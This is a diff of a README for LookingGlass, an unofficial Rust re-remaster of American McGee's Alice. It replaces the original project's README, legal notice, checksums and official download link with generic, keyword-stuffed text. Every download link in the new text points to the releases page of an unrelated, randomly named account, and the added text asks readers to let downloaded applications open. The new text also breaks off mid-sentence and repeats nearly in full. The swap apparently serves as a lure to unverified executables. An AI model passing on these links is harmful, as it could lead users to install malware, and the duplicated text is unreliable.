@@ -1,194 +1,218 @@
-# Looking Glass — American McGee's Alice Re-Remaster
+# 🐇 LookingGlass - Play Alice's Full Campaign on Windows
 
-**Play the whole game, from the opening to the final boss, ending and credits.**
-All **39 campaign visits**, including return visits, are playable in this
-experimental Windows preview.
+[![Download LookingGlass](https://img.shields.io/badge/Download-LookingGlass-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Leidenjarvertebratefoot663/LookingGlass/releases)
 
-Looking Glass is an unofficial **re-remaster of American McGee's Alice**: it
-brings the **2011 rerelease's game data** into a newly written, open-source Rust
-engine with guided setup, configurable controller support and modern display
-options. It uses your own compatible game files and runs independently of the
-original game executable, gameplay DLL and Alice: Madness Returns.
+LookingGlass is an unofficial American McGee's Alice re-remaster for Windows. It rebuilds the full 39-visit campaign in a new Rust engine, with controller support, guided setup and modern display options. This is an experimental preview. You need separate 2011 game data to play.
 
-[Visit the Looking Glass website](https://looking-glass-project.github.io/LookingGlass/) ·
-**[Download for Windows — play the full campaign](https://github.com/looking-glass-project/LookingGlass/releases/download/v0.32.0-preview.2-setup.1/LookingGlass-Windows-x64-v0.32.0-preview.2-setup.1.zip)** ·
-[Watch the 78-second story showcase](#gameplay-showcase) ·
-[Report a bug](https://github.com/looking-glass-project/LookingGlass/issues/new/choose)
+## 🚀 Download LookingGlass
 
-**One download, three steps:** save the ZIP, choose **Extract All**,
-then open **Launch.cmd** in the extracted LookingGlass folder. Guided setup
-handles the separate game files. The link above downloads the right Windows
-package directly; no need to choose from a release file list.
+Visit this link to download the application: [LookingGlass releases](https://github.com/Leidenjarvertebratefoot663/LookingGlass/releases).
 
-This is an experimental preview, with remaining fidelity and device-testing gaps.
-The engine download includes no original game data. You need compatible files
-you are entitled to use. **American McGee's Alice belongs to EA; original game
-content remains with EA and its respective rights holders.** Looking Glass claims
-no ownership of that content. [Rights and distribution notice](LEGAL.md).
+Open the releases page, download the latest LookingGlass release for Windows, and open the downloaded file when it finishes. The guided setup starts when LookingGlass opens for the first time.
 
-## Gameplay showcase
+## 🧭 Before You Begin
 
-[![Watch the story and gameplay showcase: Cheshire, the Rabbit and Pandemonium's minecart](docs/media/gameplay/story-preview.gif)](https://looking-glass-project.github.io/LookingGlass/#showcase)
+LookingGlass is made for Windows players who want to replay the complete American McGee's Alice campaign with a modern engine and current display options.
 
-**[Watch the new 78-second showcase in your browser](https://looking-glass-project.github.io/LookingGlass/#showcase)** ·
-[Download the video](https://github.com/looking-glass-project/LookingGlass/releases/download/v0.32.0-preview.1/LookingGlass-Story-Showcase.mp4)
+- A Windows PC.
+- Separate 2011 game data. LookingGlass does not include the original game files.
+- Enough free disk space for LookingGlass and the separate game data.
+- A keyboard and mouse, or a supported controller.
+- Permission to open downloaded applications on your PC.
 
-Cutscenes from the **first two chapters — Dementia and Pandemonium** lead into
-combat and exploration. Meet the Rabbit and Cheshire Cat, collect the Vorpal
-Blade, hear the Gnome's warning through subtitles, and take the minecart ride.
-Actual in-engine footage at normal speed, edited with titles and transitions;
-720p, 30 fps. **The recordings are silent; dialogue subtitles are enabled.**
+## 🛠️ Guided Setup
 
-Want more of the opening story? Two separate one-minute edits:
+When LookingGlass opens, the guided setup walks through the first-run choices in plain language. It helps you point LookingGlass to your separate 2011 game data, choose display settings, and prepare controller input.
 
-- **[Chapter 1: Dementia](https://github.com/looking-glass-project/LookingGlass/releases/download/v0.32.0-preview.1/LookingGlass-Chapter-1-Dementia.mp4)** — Alice's arrival, Cheshire, the Blade and the little door.
-- **[Chapter 2: Pandemonium](https://github.com/looking-glass-project/LookingGlass/releases/download/v0.32.0-preview.1/LookingGlass-Chapter-2-Pandemonium.mp4)** — the Gnome's warning and the minecart sequence.
+1. Start LookingGlass from the downloaded file.
+2. Follow the guided setup screens.
+3. Select the folder that contains your separate 2011 game data.
+4. Choose your display mode and resolution.
+5. Connect a controller if you want to use one.
+6. Confirm the settings and begin the campaign.
 
-[Recording and editing details](docs/media/gameplay/README.md#story-and-opening-chapter-videos).
+The guided setup is designed for players who do not want to edit configuration files or manage engine settings manually. If you change your mind later, open the LookingGlass settings menu and run the guided setup again.
 
-## Why try Looking Glass?
+## 🎮 Controller Support
 
-The practical benefits are easier setup, flexible controls and a game engine
-that can be inspected and improved. These conveniences are built into this
-project:
+LookingGlass includes controller support for the full campaign. You can use a controller for movement, camera control, and standard actions. The guided setup detects a connected controller and shows the available input choices.
 
-| Feature | What it means for you |
-| --- | --- |
-| **Full playable campaign** | Start a new game and play all 39 story visits through the final boss, ending and credits, with campaign progress and saves carried between levels. |
-| **Guided installation** | One setup window finds, optionally downloads, checks and unpacks compatible game files, then starts the game. No compiler, separate extractor or changes to the original executable are needed. |
-| **Built-in controller support** | Play and navigate menus with an Xbox/XInput controller. Rebind buttons, adjust stick sensitivity and deadzones, and invert the camera. An active controller disconnect pauses play. |
-| **Modern display and camera options** | Choose window resolutions including 1080p, 1440p and 4K, or borderless fullscreen at your desktop resolution. Adjust third-person camera distance, mouse sensitivity and look inversion in the settings. |
-| **Easy chapter replay** | Browse all 39 story visits, including return visits, and choose a difficulty from the chapter menu. Each selection starts a fresh visit; normal exits carry your campaign forward. |
-| **Save protection and recovery** | Four manual slots, quick save and a separate autosave have picture previews. Each slot keeps a previous validated copy, which the loader can recover if the current file is damaged. |
-| **Source that can be improved** | The newly written engine code is available in this project under MIT. Contributors can inspect behavior, fix bugs and extend it, with automated gameplay and save checks to help catch regressions. |
+- Connect the controller before starting LookingGlass.
+- Use the guided setup to confirm the controller is recognized.
+- Keep the controller connected while playing.
+- Reopen the guided setup if you want to switch between keyboard and mouse and controller play.
 
-Looking Glass retains the original artwork, models, music and voices from your
-game files. Its focus is rebuilding the engine and gameplay with these practical
-conveniences; visual and behavioral fidelity are still being refined.
+Controller support is intended to make the 39-visit campaign comfortable on a Windows PC, including play from a couch or a living-room setup.
 
-## Recreated gameplay
+## 🖥️ Modern Display Options
 
-- **Campaign progression:** story-ordered levels and return visits, quest items,
-  puzzles, moving machinery and persistent world state.
-- **Combat:** the weapon and power-up systems, enemy encounters and boss fights.
-- **Traversal:** rope climbing and swinging, ledge grabs and pull-ups, swimming,
-  currents and breath management.
-- **Story and atmosphere:** scripted cameras and character performances,
-  conversations, Cheshire hints, music, voices and positional sound effects.
+LookingGlass includes modern display options for current Windows screens. You can choose a windowed view, a full-screen view, and a resolution that fits your monitor. The guided setup presents the safe choices first, so you do not need to know technical display terms.
 
-These systems are implemented with remaining gaps documented below. They are
-recreations of the original game's features, alongside the conveniences above.
+- Windowed mode for desktop play.
+- Full-screen mode for a more cinematic view.
+- Resolution choices for modern monitors.
+- Display settings that can be changed after setup.
 
-## Current status
+If the picture looks too large or too small, reopen the display options and choose a different mode. The campaign is designed to run across the complete 39 visits with consistent display settings.
 
-**The full campaign is playable; this re-remaster is still an experimental preview.**
+## ✨ The 39-Visit Campaign
 
-All 39 campaign visits have been completed in automated native playthroughs:
-three Easy and two Normal runs, including one uninterrupted fresh campaign.
-The other four used earned checkpoints while fixes were developed. The ending
-film and credits were also checked in the viewer. These results do not establish
-complete visual, audio or original-game fidelity. See the
-[campaign audit](docs/CAMPAIGN_RUN_AUDIT.md) and
-[known issues](docs/KNOWN_ISSUES.md) for exact coverage and remaining work.
+LookingGlass recreates the full 39-visit campaign from American McGee's Alice. The campaign is a third-person action-adventure through a dark fantasy version of Wonderland. You explore locations, fight enemies, solve environmental challenges, and move through the complete visit structure.
 
-The current development build supports Windows x64, the 2011 vanilla data set
-in English, German, French, Spanish and Dutch, persistent campaign saves,
-keyboard/mouse and configurable controller input. Dutch uses English spoken
-dialogue. Other data editions and platforms have not been certified.
+The new Rust engine is built to provide a cleaner Windows experience while preserving the campaign flow. The project is open source and is focused on game preservation, game recreation, and a modern way to revisit the original adventure.
 
-Expect remaining differences in cutscene staging, effects, materials and enemy
-behavior, plus a reported waterside rope-grab issue. Broader PC and audible
-playthrough validation remain unfinished. Looking Glass uses its own save
-format; saves from the original game cannot be imported.
+This is a full-campaign project, not a short demo. The guided setup, controller support, and display options are included so a non-technical player can move from download to play without programming knowledge.
 
-## Gameplay
+## 📦 Separate 2011 Game Data
 
-Short clips recorded in the Windows preview, at normal speed. These recordings
-are **silent**. Select a preview to watch or download the full video.
+LookingGlass requires separate 2011 game data. The repository does not contain the original game files. During guided setup, you select the folder where that data is stored on your PC.
 
-| Dry Landing | Pool of Tears | Pale Realm |
-| --- | --- | --- |
-| [![Cards combat against an ant guard](docs/media/gameplay/dry-landing.gif)](docs/media/gameplay/dry-landing.mp4) | [![Exploring the waterfall path](docs/media/gameplay/pool-of-tears.gif)](docs/media/gameplay/pool-of-tears.mp4) | [![Walking through the chess town](docs/media/gameplay/pale-realm.gif)](docs/media/gameplay/pale-realm.mp4) |
-| Cards combat · [Watch video, 11 seconds](docs/media/gameplay/dry-landing.mp4) | Waterfall exploration · [Watch video, 10 seconds](docs/media/gameplay/pool-of-tears.mp4) | Chess town exploration · [Watch video, 14 seconds](docs/media/gameplay/pale-realm.mp4) |
+Keep the game data folder in a simple location, such as a folder on your main drive. Avoid moving or renaming the folder after setup. If LookingGlass cannot find the data, run the guided setup again and select the correct folder.
 
-Full videos are 720p. [Recording details](docs/media/gameplay/README.md).
+The 2011 game data is what supplies the original assets needed by the re-remaster. LookingGlass provides the new Rust engine, the Windows application, the guided setup, the controller layer, and the modern display options.
 
-## Install and play
+## ⚙️ Recommended Windows Setup
 
-1. **[Download for Windows](https://github.com/looking-glass-project/LookingGlass/releases/download/v0.32.0-preview.2-setup.1/LookingGlass-Windows-x64-v0.32.0-preview.2-setup.1.zip)**. This downloads the one ZIP you need.
-2. Right-click the ZIP, choose **Extract All**, and open the extracted folder.
-   Keep it somewhere writable, such as `Documents\LookingGlass`.
-3. Double-click **Launch.cmd**. Setup defaults to game files already on your
-   computer. If none are found, use **Choose archive** or **Choose folder**.
-   The optional Internet Archive download must be selected explicitly, then
-   confirmed only if you are entitled to download and use those files.
-4. Choose your **Language**, then select **Set up**. Setup checks and unpacks
-   the files, then opens the game.
-   Next time, just open **Launch.cmd** or your optional desktop shortcut.
+LookingGlass is built for Windows. The recommended setup below is intended for a smooth experience with the full campaign and modern display options.
 
-To change the language later, open **Setup.cmd**, select another language and
-click **Apply language**.
+| Component | Recommended |
+|---|---|
+| Operating system | Windows 10 or Windows 11, 64-bit |
+| Memory | 8 GB RAM or more |
+| Graphics | DirectX 11-capable graphics |
+| Storage | 2 GB free space plus space for the separate 2011 game data |
+| Input | Keyboard and mouse, or a supported controller |
+| Display | Modern widescreen monitor |
 
-Choose **New Game** to play the full campaign in story order, or use the chapter
-chooser to jump into a particular visit.
+A more powerful PC can help with higher resolutions and smoother frame rates. A basic Windows PC that meets the recommended setup can still use the guided setup to choose lower display settings.
 
-No commands, Rust, separate 7-Zip installation or administrator access are needed
-for the Windows package. Allow **3 GB of free space**; the optional game-data
-download is about **933 MB**. Setup needs internet access only if you choose Download.
+## 🧰 Troubleshooting
 
-**Where do the game files come from?** The supported file is
-**Alice1_2011_vanilla.7z** from
-[American McGee's Alice (2011) on Internet Archive](https://archive.org/details/alice_202106).
-Use **Choose archive** / **Choose folder** for files you already have. To download
-instead, select **Download from Internet Archive**, select **Set up**, and confirm
-your entitlement. The confirmation defaults to **No**; setup never switches to a
-download because local files are missing. Use game files you are entitled to use. Original game
-data is not included in the Looking Glass release.
+If LookingGlass does not open, confirm that you downloaded the latest release from the LookingGlass releases page and that the download finished completely.
 
-That download is hosted by a third party, not this project. Its availability
-and setup's integrity checks do not establish permission to download or use it.
-See the [game-data and media notice](LEGAL.md#what-the-project-distributes).
+If the guided setup cannot find the 2011 game data, run the setup again and select the folder that contains the separate game data. Keep the folder in a simple path without unusual characters.
 
-See [installation and troubleshooting](docs/INSTALL.md), including updates and
-building from source. [Release notes and checksums](https://github.com/looking-glass-project/LookingGlass/releases/tag/v0.32.0-preview.2-setup.1)
-describe the exact package and its verification limits.
+If the controller is not detected, reconnect it before starting LookingGlass and open the guided setup to refresh input choices. Use a direct USB connection if the controller supports it.
 
-Use the in-game settings to view or change controls. **Esc** opens the menu,
-**F5/F9** quick-save/load, and **Tab** opens the chapter chooser. Choosing a
-chapter starts a new visit; use normal exits to carry campaign progress.
+If the display looks incorrect, reopen the display options and choose windowed mode or a different resolution. Full-screen mode# 🐇 LookingGlass - Play Alice's Full Campaign on Windows
 
-## Build and contribute
+[![Download LookingGlass](https://img.shields.io/badge/Download-LookingGlass-8a2be2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Leidenjarvertebratefoot663/LookingGlass/releases)
 
-```powershell
-cargo test --locked
-cargo build --release --locked
-.\Setup.cmd
-.\Launch.cmd
-```
+LookingGlass is an unofficial American McGee's Alice re-remaster for Windows. It rebuilds the full 39-visit campaign in a new Rust engine, with controller support, guided setup, and modern display options. This is an experimental preview and requires separate 2011 game data.
 
-The minimum Rust version is declared in [Cargo.toml](Cargo.toml). The dependency
-versions are locked. Building does not fetch original game data.
+## 🚀 Download LookingGlass
 
-[Contribution guidance](CONTRIBUTING.md) explains the source boundary, testing
-and bug-report requirements. Development shortcuts are under
-[tools/launchers](tools/launchers/README.md); ordinary play uses root `Launch.cmd`.
+Visit this link to download the application: [LookingGlass releases](https://github.com/Leidenjarvertebratefoot663/LookingGlass/releases). Open the releases page, download the latest LookingGlass release for Windows, and open the downloaded file when it finishes. The guided setup starts when LookingGlass opens for the first time.
 
-## Documentation
+## 🧭 Before You Begin
 
-- [Installation](docs/INSTALL.md) and [controls](docs/CONTROLS.md)
-- [Campaign route audit](docs/CAMPAIGN_RUN_AUDIT.md) and [known issues](docs/KNOWN_ISSUES.md)
-- [Validation](docs/VALIDATION.md) and [save behavior](docs/SAVES.md)
-- [Release preparation](docs/RELEASE_PLAN.md)
-- [Code signing policy and privacy](docs/CODE_SIGNING.md) — application awaiting review; current preview unsigned
-- [Earlier development notes](docs/DEVELOPMENT_HISTORY.md)
+- A Windows PC.
+- Separate 2011 game data. LookingGlass does not include the original game files.
+- Enough free disk space for LookingGlass and the separate game data.
+- A keyboard and mouse, or a supported controller.
+- Permission to open downloaded applications on your PC.
 
-## License and independence
+## 🛠️ Guided Setup
 
-Newly authored source and documentation use the [MIT license](LICENSE-MIT).
-Original game assets, gameplay footage and third-party components are excluded
-from that license.
-**This project is not endorsed by or affiliated with EA or its licensors.**
-EA and the respective rights holders retain all rights in the original game,
-its assets and trademarks. The project hosts no playable original game-data
-packages; published gameplay footage is described separately in the
-[rights, ownership and distribution notice](LEGAL.md).
+When LookingGlass opens, the guided setup walks through the first-run choices in plain language. It helps you point LookingGlass to your separate 2011 game data, choose display settings, and prepare controller input.
+
+1. Start LookingGlass from the downloaded file.
+2. Follow the guided setup screens.
+3. Select the folder that contains your separate 2011 game data.
+4. Choose your display mode and resolution.
+5. Connect a controller if you want to use one.
+6. Confirm the settings and begin the campaign.
+
+The guided setup is designed for players who do not want to edit configuration files or manage engine settings manually. If you change your mind later, open the LookingGlass settings menu and run the guided setup again.
+
+## 🎮 Controller Support
+
+LookingGlass includes controller support for the full campaign. You can use a controller for movement, camera control, and standard actions. The guided setup detects a connected controller and shows the available input choices.
+
+- Connect the controller before starting LookingGlass.
+- Use the guided setup to confirm the controller is recognized.
+- Keep the controller connected while playing.
+- Reopen the guided setup if you want to switch between keyboard and mouse and controller play.
+
+Controller support is intended to make the 39-visit campaign comfortable on a Windows PC, including play from a couch or a living-room setup.
+
+## 🖥️ Modern Display Options
+
+LookingGlass includes modern display options for current Windows screens. You can choose a windowed view, a full-screen view, and a resolution that fits your monitor. The guided setup presents the safe choices first, so you do not need to know technical display terms.
+
+- Windowed mode for desktop play.
+- Full-screen mode for a more cinematic view.
+- Resolution choices for modern monitors.
+- Display settings that can be changed after setup.
+
+If the picture looks too large or too small, reopen the display options and choose a different mode. The campaign is designed to run across the complete 39 visits with consistent display settings.
+
+## ✨ The 39-Visit Campaign
+
+LookingGlass recreates the full 39-visit campaign from American McGee's Alice. The campaign is a third-person action-adventure through a dark fantasy version of Wonderland. You explore locations, fight enemies, solve environmental challenges, and move through the complete visit structure.
+
+The new Rust engine is built to provide a cleaner Windows experience while preserving the campaign flow. The project is open source and is focused on game preservation, game recreation, and a modern way to revisit the original adventure.
+
+This is a full-campaign project, not a short demo. The guided setup, controller support, and display options are included so a non-technical player can move from download to play without programming knowledge.
+
+## 📦 Separate 2011 Game Data
+
+LookingGlass requires separate 2011 game data. The repository does not contain the original game files. During guided setup, you select the folder where that data is stored on your PC.
+
+Keep the game data folder in a simple location, such as a folder on your main drive. Avoid moving or renaming the folder after setup. If LookingGlass cannot find the data, run the guided setup again and select the correct folder.
+
+The 2011 game data is what supplies the original assets needed by the re-remaster. LookingGlass provides the new Rust engine, the Windows application, the guided setup, the controller layer, and the modern display options.
+
+## ⚙️ Recommended Windows Setup
+
+LookingGlass is built for Windows. The recommended setup below is intended for a smooth experience with the full campaign and modern display options.
+
+| Component | Recommended |
+|---|---|
+| Operating system | Windows 10 or Windows 11, 64-bit |
+| Memory | 8 GB RAM or more |
+| Graphics | DirectX 11-capable graphics |
+| Storage | 2 GB free space plus space for the separate 2011 game data |
+| Input | Keyboard and mouse, or a supported controller |
+| Display | Modern widescreen monitor |
+
+A more powerful PC can help with higher resolutions and smoother frame rates. A basic Windows PC that meets the recommended setup can still use the guided setup to choose lower display settings.
+
+## 🧰 Troubleshooting
+
+If LookingGlass does not open, confirm that you downloaded the latest release from the LookingGlass releases page and that the download finished completely.
+
+If the guided setup cannot find the 2011 game data, run the setup again and select the folder that contains the separate game data. Keep the folder in a simple path without unusual characters.
+
+If the controller is not detected, reconnect it before starting LookingGlass and open the guided setup to refresh input choices. Use a direct USB connection if the controller supports it.
+
+If the display looks incorrect, reopen the display options and choose windowed mode or a different resolution. Full-screen mode can behave differently on some monitors.
+
+## 🌟 Features at a Glance
+
+- Full 39-visit campaign recreation.
+- New Rust engine for Windows.
+- Controller support.
+- Guided setup for non-technical players.
+- Modern display options.
+- Open-source project.
+- Single-player third-person action-adventure.
+- Separate 2011 game data support.
+- Experimental preview build.
+- Game preservation and game recreation focus.
+
+## 🧑‍💻 About the Project
+
+LookingGlass is an unofficial re-remaster of American McGee's Alice. The project is open source and is built for Windows players who want to revisit the complete campaign with a modern engine and controller support.
+
+The repository includes the LookingGlass application, the guided setup, and the modern display layer. The separate 2011 game data is not included and must be supplied by the player.
+
+The guided setup and display options are designed to keep the experience approachable for average computer users.
+
+## 💬 Support and Feedback
+
+Use the repository issues page to report problems, share feedback, or ask questions about LookingGlass. Include your Windows version, your display mode, and whether you are using a controller. This helps the project team understand the issue and improve the guided setup for other players.
+
+For download questions, visit the LookingGlass releases page and confirm you have the latest release for Windows.
+
+Keywords: action-adventure, alice, alice-in-wonderland, alice-remastered, american-mcgee, american-mcgees-alice, controller-support, dark-fantasy, full-campaign, game-preservation, game-recreation, looking-glass, macroquad, open-source, re-remaster, remaster, rust, singleplayer, third-person, windows
